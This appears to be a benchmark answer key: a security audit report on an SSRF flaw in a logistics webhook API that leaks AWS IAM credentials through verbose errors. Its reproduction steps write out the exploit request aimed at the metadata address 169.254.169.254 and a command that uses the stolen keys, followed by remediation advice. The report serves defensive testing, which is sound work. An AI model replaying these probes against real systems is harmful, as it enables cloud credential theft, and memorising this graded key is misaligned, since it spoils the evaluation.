# Expected Response

## System
- **Name:** GlobalLogis WMS Integration Gateway
- **Domain:** Supply Chain / Fulfillment / Third-Party Logistics (3PL)
- **Document version analysed:** 11.4.2 (FINAL) + implementation doc 6.1.0

---

## Priority Findings

### Finding 1 — SSRF via Webhook URL: AWS Instance Metadata Service Targeted (Pattern 5.3 — SSRF via user-controlled URLs)
**Severity:** Critical / Cloud Credential Theft
**Affected endpoint:** `POST https://api.globallogis.b2b/api/v2/webhooks/register`
**Referenced in context:** Section 4.0 (Pattern 6.1 / RISK-B2B-042), Section 5.0 (code), Section 6.0 (API contract), HAR trace

**Summary:**
The Webhook Registration Service (Section 5.0, `webhookController.js`) performs a server-side HTTP GET to a partner-supplied `target_url` for auto-validation (Epic WMS-771). The only input validation (Section 5.0, line 82) checks whether the URL starts with `http://` or `https://` — it does not check whether the resolved host is a private RFC1918 address or the AWS link-local metadata IP `169.254.169.254`.

This allows any authenticated B2B partner to supply `http://169.254.169.254/latest/meta-data/iam/security-credentials/wms-eks-worker-role` as the `target_url`. The GlobalLogis EKS worker node — operating within the AWS VPC — will make an outbound GET request to its own IMDS endpoint, which returns the temporary IAM credentials for the `wms-eks-worker-role` role.

**Evidence from HAR:**
- Request: `POST https://api.globallogis.b2b/api/v2/webhooks/register`
- API key: `ak_live_RETAIL_99X_88192a` (partner `RETAIL_99X`)
- Request body: `"target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/wms-eks-worker-role"`
- `169.254.169.254` is the AWS link-local IMDS address — a universally recognized SSRF indicator

---

### Finding 2 — Verbose Error Handling: AWS IAM Credentials Leaked in 400 Response (Pattern 6.2 — Verbose error feedback)
**Severity:** Critical / AWS Credential Exfiltration
**Affected endpoint:** `POST https://api.globallogis.b2b/api/v2/webhooks/register` (error path)
**Referenced in context:** Section 5.0 (error handler), Section 4.0 (Pattern 2.3), HAR response body

**Summary:**
When the Node.js service fetches the IMDS endpoint, it receives a `text/plain` response (the AWS credentials). The code forces `JSON.parse()` on the plaintext (Section 5.0, line 96), which throws a `SyntaxError`. The Express global error handler (`middleware/errorHandler.js`) returns `err.message` directly to the client (the LEAKAGE POINT comment). Because `NODE_ENV` was accidentally set to `development` in the production EKS cluster (Section 5.0, note), the full `stack_trace` is also returned.

The `err.message` contains the raw IMDS response text — which is the complete AWS credential set for the `wms-eks-worker-role` IAM role.

**Evidence from HAR response body:**
The `error_message` field in the `400 Bad Request` response contains:
```
"AccessKeyId": "ASIAX5EXAMPLEKEYABCD",
"SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
"Token": "IQoJb3JpZ2luX2VjEJv...[TRUNCATED_SESSION_TOKEN]...12345",
"Expiration": "2026-04-09T13:10:00Z"
```
The `stack_trace` field reveals the internal file path: `/app/controllers/webhookController.js:28:19`, confirming `NODE_ENV=development` is active in production.

---

## Evidence Map

| Artifact location | Finding 1 (SSRF) | Finding 2 (Credential Leak) |
|---|---|---|
| Section 2.3 | IMDSv1 fallback left enabled; hop limit set to 2 (EKS accessible) | `NODE_ENV=development` in production |
| Section 4.0 / RISK-B2B-042 | No IP denylist on `target_url` | Verbose error handler mirrors raw fetched content |
| Section 5.0 (code line 82) | Only checks `http://`/`https://` prefix | — |
| Section 5.0 (code line 96) | IMDS response triggers `JSON.parse()` exception | Exception message contains raw IMDS text |
| Section 5.0 error handler | — | `err.message` returned directly in response |
| HAR request body | `target_url: http://169.254.169.254/...` | — |
| HAR response body | — | `AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration` in `error_message` |
| HAR response stack_trace | — | `/app/controllers/webhookController.js:28:19` — production stack leak |

---

## Steps to Reproduce

### Finding 1 + Finding 2 — SSRF → Credential Exfiltration (combined in one probe)

**Step 1 — Verify normal webhook registration (baseline)**
```
POST https://api.globallogis.b2b/api/v2/webhooks/register
X-API-Key: ak_live_RETAIL_99X_88192a
Content-Type: application/json

{
  "event_type": "INVENTORY_LOW_STOCK",
  "target_url": "https://api.retail-partner.com/callbacks/globallogis",
  "secret_key": "wh_sec_baseline_01"
}
```
Expected: `201 Created` with `{"status": "Webhook registered successfully."}` — confirms target_url reachability check occurs server-side.

**Step 2 — SSRF probe with AWS IMDS URL (exact HAR replay)**
```
POST https://api.globallogis.b2b/api/v2/webhooks/register
X-API-Key: ak_live_RETAIL_99X_88192a
Content-Type: application/json
User-Agent: Retail-ERP-Agent/3.1.0

{
  "event_type": "INVENTORY_LOW_STOCK",
  "target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/wms-eks-worker-role",
  "secret_key": "wh_sec_malicious123"
}
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `400 Bad Request`
- Response body contains `error_code: "WEBHOOK_VALIDATION_FAILED"` and `error_message` that includes the AWS IMDS JSON response
- Within `error_message`: look for `"AccessKeyId"`, `"SecretAccessKey"`, `"Token"`, `"Expiration"` fields — these are live temporary IAM credentials
- Within `stack_trace`: internal file path `/app/controllers/webhookController.js` confirms `NODE_ENV=development` in production
- Credentials are valid until the `Expiration` timestamp shown in the response

**Secure outcome:**
- If SSRF is blocked: `400 Bad Request` with `{"error": "Invalid URL scheme."}` or `{"error": "URL resolves to a restricted IP range."}` — no IMDS content in response
- If error handling is fixed: `400 Bad Request` with only `{"error_code": "WEBHOOK_VALIDATION_FAILED", "error_message": "Webhook endpoint validation failed."}` — no raw fetched content, no stack trace

**Step 3 — Use leaked credentials (post-exploitation verification)**
```bash
aws sts get-caller-identity \
  --access-key-id ASIAX5EXAMPLEKEYABCD \
  --secret-access-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
  --session-token "IQoJb3JpZ2luX2VjEJv..."
```
Expected vulnerable outcome: returns the IAM identity of `wms-eks-worker-role`, confirming the credentials are valid and the attacker has assumed the WMS node's IAM role.

---

## Remediation

**Finding 1 (SSRF):**
1. Implement a URL denylist that blocks `target_url` values resolving to: `169.254.169.254`, `169.254.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, and `127.0.0.0/8` before any outbound request is made.
2. Use DNS resolution to check the IP of the supplied hostname (not just the raw string), as attackers can use hostnames that resolve to internal IPs.
3. Disable IMDSv1 on all EKS worker nodes — Section 2.3 notes the legacy fallback was accidentally left enabled; this is the remediation for the Terraform misconfiguration.

**Finding 2 (Verbose Error / Credential Leak):**
1. In `errorHandler.js`: replace `err.message` with a static, generic message: `"Webhook endpoint validation failed."`. Never return raw fetched external content in an error response.
2. Set `NODE_ENV=production` in the EKS deployment manifest to suppress `stack_trace` in responses.
3. Add a secret scanner to the error handler: if `err.message` matches patterns like `AccessKeyId`, `SecretAccessKey`, or token strings, emit an internal security alert instead of including the content in the HTTP response.
